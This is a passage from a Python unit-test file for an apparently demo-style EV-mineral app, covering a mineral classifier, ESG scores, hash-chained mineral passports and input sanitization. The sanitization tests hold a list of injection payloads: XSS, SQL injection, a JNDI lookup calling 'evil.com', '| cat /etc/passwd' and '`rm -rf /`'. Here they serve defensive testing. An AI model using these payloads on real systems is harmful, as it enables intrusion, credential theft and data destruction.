        print(f"[BENCHMARK] MineralNet Total Parameters: {param_count:,}")
        self.assertLess(param_count, 100000, "Model must remain lightweight for instant inference")

    def test_170_batch_1000_predictions_vectorized(self):
        feats = np.random.randn(1000, 3)
        feats_scaled = self.scaler.transform(feats)
        with torch.no_grad():
            out = self.model(torch.tensor(feats_scaled, dtype=torch.float32))
            probs = torch.softmax(out, dim=1).numpy()
        self.assertEqual(probs.shape, (1000, 12))

    def test_171_all_countries_yield_predictions(self):
        for country in self.all_50_countries:
            df_c = self.df_occ[self.df_occ["Country"] == country]
            lat = df_c["Latitude"].mean()
            lon = df_c["Longitude"].mean()
            feat = self.scaler.transform([[lat, lon, 1]])
            with torch.no_grad():
                out = self.model(torch.tensor(feat, dtype=torch.float32))
                probs = torch.softmax(out, dim=1).numpy().flatten()
            self.assertEqual(len(probs), 12)
            self.assertFalse(np.isnan(probs).any())

    def test_172_consistent_output_with_same_input(self):
        feat = self.scaler.transform([[45.0, -75.0, 1]])
        with torch.no_grad():
            p1 = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
            p2 = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        np.testing.assert_array_almost_equal(p1, p2)

    def test_173_grade_toggle_changes_feature(self):
        f1 = self.scaler.transform([[10.0, 10.0, 1]])
        f2 = self.scaler.transform([[10.0, 10.0, 0]])
        self.assertNotEqual(f1[0, 2], f2[0, 2])

    def test_174_scaler_preserves_finite_values(self):
        feats = np.array([[0, 0, 0], [45, 90, 1], [-45, -90, 0]])
        scaled = self.scaler.transform(feats)
        self.assertTrue(np.isfinite(scaled).all())

    def test_175_label_encoder_inverse_preserves_classes(self):
        for i in range(12):
            cls_name = self.le.inverse_transform([i])[0]
            self.assertEqual(self.le.transform([cls_name])[0], i)

    def test_176_no_memory_leak_on_repeated_calls(self):
        for _ in range(500):
            _ = self.model(torch.randn(1, 3))
        self.assertTrue(True)

    def test_177_pydeck_tooltip_string_format(self):
        sample = self.df_occ.iloc[0]
        tooltip = f"{sample['Mineral']} in {sample['Country']}"
        self.assertIsInstance(tooltip, str)

    def test_178_dataset_csv_reproducibility(self):
        first_row = self.df.iloc[0]
        self.assertIsNotNone(first_row['commod'])
        self.assertIsNotNone(first_row['country'])

    def test_179_confidence_above_random_chance(self):
        # Random chance among 12 classes is 1/12 = 8.33%
        # Model should typically have confidence > 15%
        feat = self.scaler.transform([[-23.5, -68.3, 1]])
        with torch.no_grad():
            probs = torch.softmax(self.model(torch.tensor(feat, dtype=torch.float32)), dim=1).numpy().flatten()
        max_conf = max(probs)
        self.assertGreater(max_conf, 0.15)

    # =========================================================================
    # SUITE 8: GLOBAL ESG MATRIX VALIDATION (50 COUNTRIES x 12 MINERALS = 600 SUB-TESTS)
    # =========================================================================
    def test_181_to_780_global_esg_matrix_coverage(self):
        """Validates ESG scorecard calculation across all 50 countries and 12 EV minerals (600 test cases)."""
        valid_ratings = {"AAA", "AA", "A", "BBB", "BB", "B", "CCC"}
        for country in self.all_50_countries:
            for mineral in self.ev_minerals:
                with self.subTest(country=country, mineral=mineral):
                    card = calculate_esg_scorecard(country, mineral, grade="A")
                    self.assertIsInstance(card, dict)
                    self.assertIn("composite_eedi", card)
                    self.assertTrue(0 <= card["composite_eedi"] <= 100, f"EEDI score out of range for {country}-{mineral}: {card['composite_eedi']}")
                    self.assertIn(card["rating"], valid_ratings, f"Invalid rating for {country}-{mineral}: {card['rating']}")
                    self.assertTrue(0 <= card["environmental_pillar"] <= 100)
                    self.assertTrue(0 <= card["social_governance_pillar"] <= 100)
                    self.assertGreater(card["carbon_intensity_tco2e"], 0)
                    self.assertTrue(0 <= card["water_stress_index"] <= 100)

    # =========================================================================
    # SUITE 9: QUANTUM-SAFE CRYPTOGRAPHIC PASSPORT & ANTI-TAMPERING (55 TESTS)
    # =========================================================================
    def test_781_to_830_passport_minting_all_50_countries(self):
        """Mints and cryptographically validates post-quantum passports for all 50 countries."""
        prev_hash = "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f"
        for country in self.all_50_countries:
            with self.subTest(country=country):
                card = calculate_esg_scorecard(country, "Lithium", grade="A")
                passport = generate_quantum_safe_mineral_passport(
                    deposit_name=f"{country} Test Concession",
                    mineral="Lithium",
                    country=country,
                    grade="A",
                    esg_scorecard=card,
                    previous_block_hash=prev_hash
                )
                self.assertTrue(passport["passport_id"].startswith("IBMZ-MP-"))
                self.assertEqual(len(passport["block_hash"]), 128) # SHA-512 hex length
                self.assertEqual(len(passport["hsm_hmac_signature"]), 128) # HMAC-SHA512 length
                self.assertTrue(passport["quantum_signature"].startswith("ML-DSA-87-SIG:"))
                
                # Verify authentic signature
                audit = verify_quantum_safe_mineral_passport(passport)
                self.assertTrue(audit["valid"], f"Verification failed for {country}: {audit.get('reason')}")
                self.assertFalse(audit["tampered"])
                prev_hash = passport["block_hash"]

    def test_831_passport_tamper_country_rejected(self):
        card = calculate_esg_scorecard("Chile", "Lithium", "A")
        passport = generate_quantum_safe_mineral_passport("Atacama Concession", "Lithium", "Chile", "A", card)
        tamper_res = simulate_tamper_attempt(passport, "country", "FraudulentCountry")
        self.assertTrue(tamper_res["detected_by_security"])
        self.assertFalse(tamper_res["verification_result"]["valid"])

    def test_832_passport_tamper_eedi_score_rejected(self):
        card = calculate_esg_scorecard("DR Congo", "Cobalt", "A")
        passport = generate_quantum_safe_mineral_passport("Kolwezi Mine", "Cobalt", "DR Congo", "A", card)
        tamper_res = simulate_tamper_attempt(passport, "eedi_score", 99.9)
        self.assertTrue(tamper_res["detected_by_security"])
        self.assertFalse(tamper_res["verification_result"]["valid"])

    def test_833_passport_tamper_signature_rejected(self):
        card = calculate_esg_scorecard("Australia", "Nickel", "A")
        passport = generate_quantum_safe_mineral_passport("Kambalda Mine", "Nickel", "Australia", "A", card)
        tampered_copy = dict(passport)
        tampered_copy["hsm_hmac_signature"] = "0" * 128
        audit = verify_quantum_safe_mineral_passport(tampered_copy)
        self.assertFalse(audit["valid"])
        self.assertTrue(audit["tampered"])

    def test_834_passport_empty_payload_rejected(self):
        audit = verify_quantum_safe_mineral_passport({})
        self.assertFalse(audit["valid"])
        self.assertTrue(audit["tampered"])

    def test_835_hash_chain_linkage_verification(self):
        card1 = calculate_esg_scorecard("Chile", "Lithium", "A")
        p1 = generate_quantum_safe_mineral_passport("Block 1", "Lithium", "Chile", "A", card1)
        card2 = calculate_esg_scorecard("Australia", "Lithium", "A")
        p2 = generate_quantum_safe_mineral_passport("Block 2", "Lithium", "Australia", "A", card2, previous_block_hash=p1["block_hash"])
        self.assertEqual(p2["previous_block_hash"], p1["block_hash"])

    # =========================================================================
    # SUITE 10: EXPLAINABLE AI (XAI) PLAIN-LANGUAGE REASONER (36 TESTS)
    # =========================================================================
    def test_836_to_847_xai_all_12_minerals_grade_a(self):
        """Tests XAI explanation and feature attributions for all 12 minerals in Grade A."""
        for mineral in self.ev_minerals:
            with self.subTest(mineral=mineral):
                res = explain_prediction(self.model, self.scaler, self.le, lat=-23.5, lon=-68.3, grade_val=1, country="Chile", predicted_mineral=mineral)
                self.assertIn("feature_attributions", res)
                self.assertIn("North-South Location (Latitude)", res["feature_attributions"])
                self.assertIn("East-West Location (Longitude)", res["feature_attributions"])
                self.assertIn("Mine Quality Rating (Grade A or B)", res["feature_attributions"])
                attrib_sum = sum(res["feature_attributions"].values())
                self.assertAlmostEqual(attrib_sum, 100.0, delta=1.5)
                self.assertIn("plain_summary", res)
                self.assertIn(mineral, res["plain_summary"])

    def test_848_to_859_xai_all_12_minerals_grade_b(self):
        """Tests XAI explanation and feature attributions for all 12 minerals in Grade B."""
        for mineral in self.ev_minerals:
            with self.subTest(mineral=mineral):
                res = explain_prediction(self.model, self.scaler, self.le, lat=10.0, lon=20.0, grade_val=0, country="DR Congo", predicted_mineral=mineral)
                self.assertIn("geological_rationale", res)
                self.assertIsInstance(res["geological_rationale"], str)
                self.assertGreater(len(res["geological_rationale"]), 10)

    def test_860_to_871_geological_knowledge_base_plain_language(self):
        """Validates all 12 minerals have clear, plain-language geological rationales."""
        for mineral in self.ev_minerals:
            with self.subTest(mineral=mineral):
                kb = GEOLOGICAL_REASONING_KNOWLEDGE_BASE.get(mineral, {})
                self.assertIn("Default", kb)
                self.assertIsInstance(kb["Default"], str)
                self.assertGreater(len(kb["Default"]), 15)

    # =========================================================================
    # SUITE 11: SECURITY, SANITIZATION & ANTI-INJECTION GUARDS (25 TESTS)
    # =========================================================================
    def test_872_sanitize_script_tags(self):
        cleaned = sanitize_text("<script>alert('xss')</script>")
        self.assertNotIn("<", cleaned)
        self.assertNotIn(">", cleaned)
        self.assertNotIn(";", cleaned)

    def test_873_sanitize_sql_injection(self):
        cleaned = sanitize_text("Chile'; DROP TABLE users; --")
        self.assertNotIn(";", cleaned)
        self.assertNotIn("'", cleaned)

    def test_874_sanitize_truncates_oversized_string(self):
        long_str = "A" * 500
        cleaned = sanitize_text(long_str, max_length=60)
        self.assertEqual(len(cleaned), 60)

    def test_875_sanitize_handles_none_or_number(self):
        self.assertEqual(sanitize_text(12345), "12345")

    def test_876_sanitize_preserves_valid_country_names(self):
        self.assertEqual(sanitize_text("United States"), "United States")
        self.assertEqual(sanitize_text("Papua New Guinea"), "Papua New Guinea")

    def test_877_to_896_injection_country_lookup_resilience(self):
        """Tests that 20 diverse injection and edge inputs are handled safely without crash."""
        payloads = [
            "<img src=x onerror=alert(1)>", "SELECT * FROM dataset", "1' OR '1'='1",
            "../../etc/shadow", "%00%00%00", "\x00\x01\x02", "🇨🇱 Chile 123",
            "Robert'); DROP TABLE Students;--", "${jndi:ldap://evil.com/a}",
            "{{7*7}}", "{\"action\": \"admin\"}", "\\x1b[31mRed\\x1b[0m",
            "&& dir C:\\", "| cat /etc/passwd", "file:///c:/boot.ini",
            "`rm -rf /`", "<svg/onload=alert('xs')>", "javascript:alert(1)",
            "'; waitfor delay '0:0:5'--", "' UNION SELECT null, null, null--"
        ]
        for p in payloads:
            with self.subTest(payload=p):
                clean_p = sanitize_text(p)
                df_match = self.df_occ[self.df_occ["Country"].str.lower() == clean_p.lower()]
                self.assertTrue(df_match.empty, f"Malicious payload '{p}' unexpectedly matched country data!")

    # =========================================================================
    # SUITE 12: IBM LINUXONE GREEN COMPUTE CARBON REDUCTIONS (20 TESTS)
    # =========================================================================
    def test_897_to_916_linuxone_sustainability_scales(self):
        """Tests LinuxONE Emperor 4 sustainability calculations across 20 server consolidation tiers (10 to 200 nodes)."""
        for server_count in range(10, 210, 10):
            with self.subTest(server_count=server_count):
                res = calculate_linuxone_sustainability(server_count)
                self.assertGreater(res["kwh_saved_annually"], 0)
                self.assertTrue(65.0 <= res["reduction_percentage"] <= 85.0)
                self.assertGreater(res["co2_tonnes_avoided"], 0)
                self.assertGreater(res["annual_cost_savings_usd"], 0)
                self.assertGreater(res["five_year_savings_usd"], 0)
                self.assertGreater(res["seedlings_planted_equivalent"], 0)

if __name__ == "__main__":
    unittest.main(verbosity=2)
